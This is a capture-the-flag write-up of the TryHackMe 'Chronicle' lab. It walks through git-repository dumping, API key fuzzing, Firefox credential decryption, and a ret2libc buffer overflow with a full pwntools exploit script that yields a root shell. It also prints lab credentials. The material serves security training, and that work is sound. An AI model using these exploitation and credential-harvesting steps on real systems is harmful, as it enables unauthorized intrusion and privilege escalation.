---
date: 2025-03-15
categories: [CTF, THM]
title: "THM - Chronicle"
tags: ['gobuster', 'linux', 'nmap', 'privilege escalation', 'python', 'rce']

description: "Chronicle  (good ret2libc lab - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# THM - Chronicle (good ret2libc lab)

NMAP

![image1](../resources/14057f1d9542453899f2ba16e9ea99ae.png)

`http://10.10.200.236/old/`

![image2](../resources/845c7abfbb254f1a9dca21d5ba2473f8.png)

```bash
gobuster dir -u http://10.10.200.236/old -w /usr/share/seclists/Discovery/Web-Content/big.txt | grep -v 302
```

![image3](../resources/06fc47491af048e3843310e3dbcd3c68.png)

Found .git


![image4](../resources/d4143950bfdd448f85875c9fe6d30fa0.png)

- Download .git:
```bash
wget --recursive http://10.10.200.236/old/.git/ --continue

```
or use (--mirror)

- Read .git files:

```bash
git status

```

![image5](../resources/5bf1e31a609c477696a627acd978cd9a.png)

```bash
git checkout -- .

```
or

```bash
git restore .

```

![image6](../resources/bef4033a559e410b8745f7686767b035.png)

Got the deleted files

Nothing in them.

- Look at the logs and grep for key:
```bash
git log -p | grep "key"

```

![image7](../resources/d53af304c7684560abe919982751f7c1.png)

`http://10.10.200.236:8081/forgot`

![image8](../resources/e2a161d7461647c6af772c61f68b527f.png)


![image9](../resources/57d86c5163c54ffa85a9ff76a2b7d1ba.png)

![image10](../resources/ae5254062bb949d58b337fa5f9b23577.png)


![image11](../resources/6857969dd2d04ec19dd8df3c665a749a.png)

Open in Burp:


![image12](../resources/94fc2d164bfa4c11a7312e6972d5d76c.png)


![image13](../resources/a3c0557ac2284b249d9b8652a0e991a2.png)

Try changing the key value:


![image14](../resources/2f31061bf3ac4dceb9b08cb1b5d93218.png)

Try the API key found in the git logs:

![image15](../resources/d7ee1004730945a1b5bc52d18b3a9f2a.png)

Get - "Invalid Username" this time - so the key works


![image16](../resources/f844e58f66fe4f0a9285dd275c4b6796.png)


![image17](../resources/5cd82326f80a415fb7d656ee3b02463b.png)

- Try fuzzing the right user (API Fuzzing):

```bash
ffuf -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -X POST -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}' -u http://10.10.200.236:8081/api/FUZZ -fw 2

```

![image18](../resources/c40962ddcb4545d882bd3d56bf59429d.png)


![image19](../resources/9f9697738d9742aea229c732c0cbd4bc.png)

{"username":"**tommy**","password":"**DevMakesStuff01**"}

Credentials to SSH:

![image20](../resources/a17ac87b70c641fdac5230b489b4e30a.png)

```bash
cat user.txt

```

![image21](../resources/e06fa9892f91416e81105e38e9494c70.png)

```bash
last
```

![image22](../resources/d6168d15854f430586a38e6521dd1f53.png)

Two new IP's:
**192.168.29.217**
**192.168.166.1**

But no network for those IP's:

![image23](../resources/7b8572cbec504a01b99230d78022c54f.png)

carlJ has a .mozilla directory

![image24](../resources/adf4c364812a430582bc1417d6122163.png)

Copy directory to /tmp
Copy the directory over to Kali:


![image25](../resources/94d2e1df2e1f48018cf7239d1623d510.png)

```bash
wget http://10.10.200.236:8082/.mozilla/ --recursive --continue

```
- Use firefox_decrypt to get the password:

![image26](../resources/fbe2a86216854d6da8971df969e757b4.png)

The second one requires a Primary Password to unlock the profile

Tried some simple passwords:

**password1** worked


![image27](../resources/efa4294a5e4149b1931b5d350cc3c738.png)

Username: '**dev**'

Password: '**Pas\$w0RD59247**'

- su to carlJ

![image28](../resources/31342d210d1a48f095b1972addaca04f.png)

- Looking in mailing/ there seems to be an executable with SUID permissions
(Buffer overflow?)


![image29](../resources/ef870481affe4ad5af4fcc1bd0dcb174.png)


![image30](../resources/86c107ce77cd48ec958ae4a26d5b5daa.png)

Seg fault on option 2:


![image31](../resources/352c16470d214620936469090991bca1.png)

- Check protections:
```bash
checksec smail

```
or

```bash
pwn checksec smail

```

![image32](../resources/80749b3b1e5c42858519465464185834.png)

No PIE, so the binary is not affected by ASLR

- Check if ASLR has been enabled on the system:
```bash
cat /proc/sys/kernel/randomize_va_space

```

![image33](../resources/925c5815ee604527a4d8a7609ab32a9f.png)

**0 means NO**

- **Because ASLR is not enabled, we don't need a leak function to get the base address**
**Instead:**

- Getting libc and its base:

```bash
ldd smail

```

![image34](../resources/476117a67d984b6ca505ded04f6f1e90.png)

Gives the base address of libc (which can be trusted - because no ASLR)

Also, the base address should end in three 0's - which it does:

**0x7ffff79e2000**

- Getting the location of system():
```bash
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system

```
The -s flag tells readelf to search for symbols, for example functions


![image35](../resources/f3590a4a4b3a46649740d6d7a57a5d8b.png)

**1403: 000000000004f550 45 FUNC WEAK DEFAULT 13 system@@GLIBC_2.2.5**

The <u>offset</u> of system <u>from libc</u> base is: **0x4f550**

(system = libc_base + **0x4f550**)

- Getting the location of /bin/sh:

Since /bin/sh is just a string, we can use strings on the dynamic library we just found with ldd.

Note that when passing strings as parameters you need to pass a pointer to the string,

not the hex representation of the string, because that's how C expects it

```bash
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh

```
-a tells it to scan the entire file

-t x tells it to output the offset in hex


![image36](../resources/026e8b25b5754d63890972f1df1bae68.png)

/bin/sh address: **0x1b3e1a**

- **<u>Because this is a 64bit arch:</u>**
  1.  Instead of passing the parameter in after the return pointer, you will have to use a pop rdi; ret gadget to put it into the RDI register

```bash
ROPgadget --binary smail | grep rdi

```

![image37](../resources/92b35f61b5a94f098d51f15741ee9bfa.png)

ROPgadget lets you search your gadgets on a binary.

It supports several file formats and architectures and uses the Capstone disassembler for the search engine

pop rdi; ret address: **0x4007f3**

2.  Find the address of a return function:

```bash
objdump -d smail | grep ret

```

![image38](../resources/e762cf2bf6cd4b9ea271656b35b39360.png)

Return address: **0x400556**

- Copy **smail** over to Kali
- chmod +x smail

- Open with gdb (gef)

```bash
gdb smail

```

![image39](../resources/fe58c87d84c1435282dd025192f0165b.png)

pattern create (copy pattern)


![image40](../resources/3ca73ad0ea2e440099f538068914bb3a.png)

r - To run

Copy pattern into signature


![image41](../resources/d91daec5859849958a5a22def752e3f0.png)

- Find the offset:
```bash
pattern search $rsp

```

![image42](../resources/2fb9362824de4672aef6c4749afdbab7.png)

- Create the payload (pwntools):
```python
#!/usr/bin/python3

from pwn import *

p = process('./smail')

# Addresses (example: these would need to match your libc + binary setup)
libc_base = 0x7ffff79e2000
system = libc_base + 0x4f550
binsh = libc_base + 0x1b3e1a
POP_RDI = 0x4007f3  # pop rdi; ret gadget

# Create the payload
payload = b'A' * 72                   # Buffer overflow padding
payload += p64(0x400556)              # Optional stack alignment (ret)
payload += p64(POP_RDI)               # Gadget to control RDI
payload += p64(binsh)                 # "/bin/sh" address
payload += p64(system)                # system("/bin/sh")
payload += p64(0x0)                   # Optional return address

# Interact with the process
p.clean()
p.sendline("2")
p.sendline(payload)
p.interactive()
```

- Root shell!

![image43](../resources/bc922f419a714c65b02313c7a6e10489.png)

- If you get the EOF message, check your addresses again to make sure they are correct

![image44](../resources/2947e34cbc3443a9b29f8c994f4ad49b.png)